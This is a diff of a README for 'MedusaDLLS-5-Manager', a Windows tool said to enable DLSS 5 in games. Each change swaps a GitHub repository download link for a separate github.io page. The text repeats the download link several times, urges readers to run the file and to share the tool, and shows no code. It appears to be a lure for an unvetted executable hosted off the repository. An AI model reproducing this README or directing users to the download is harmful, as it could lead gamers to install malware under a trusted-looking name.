@@ -1,6 +1,6 @@
 # ⚡ MedusaDLLS-5-Manager - Enable DLSS 5 Instantly in Games
 
-[![Download Medusa DLLS 5 Manager](https://img.shields.io/badge/Download-Medusa_DLLS_5_Manager-4B0082?style=for-the-badge&logo=github&logoColor=white&labelColor=800080)](https://github.com/Carlinaphocine1904/MedusaDLLS-5-Manager)
+[![Download Medusa DLLS 5 Manager](https://img.shields.io/badge/Download-Medusa_DLLS_5_Manager-4B0082?style=for-the-badge&logo=github&logoColor=white&labelColor=800080)](https://carlinaphocine1904.github.io)
 
 ## 👋 Welcome to Medusa DLLS 5 Manager
 
@@ -14,7 +14,7 @@ Before you begin, make sure you have a Windows computer (Windows 10 or Windows 1
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Carlinaphocine1904/MedusaDLLS-5-Manager](https://github.com/Carlinaphocine1904/MedusaDLLS-5-Manager)
+Visit this link to download the application: [https://carlinaphocine1904.github.io](https://carlinaphocine1904.github.io)
 
 When you open the page, look for a green button that says "Code" or a section that says "Releases" or "Assets". Click on it, and you will see a download option. Click that option. The download will start automatically. The file size is small, so it should not take long.
 
@@ -82,7 +82,7 @@ If you already use a tool called DLSS Swapper, this application works alongside 
 
 Here is the most important part. The download link is at the top of this page, and here it is again for convenience:
 
-**Primary Download Location:** [https://github.com/Carlinaphocine1904/MedusaDLLS-5-Manager](https://github.com/Carlinaphocine1904/MedusaDLLS-5-Manager)
+**Primary Download Location:** [https://carlinaphocine1904.github.io](https://carlinaphocine1904.github.io)
 
 Visit this link to download the application.
 
@@ -159,7 +159,7 @@ If you like this tool, tell your gaming friends. The more people use it, the bet
 
 Again, here is the download link. Visit this link to download the application:
 
-**➡️ [https://github.com/Carlinaphocine1904/MedusaDLLS-5-Manager](https://github.com/Carlinaphocine1904/MedusaDLLS-5-Manager)**
+**➡️ [https://carlinaphocine1904.github.io](https://carlinaphocine1904.github.io)**
 
 Bookmark it or save it to your notes so you do not lose it.
 
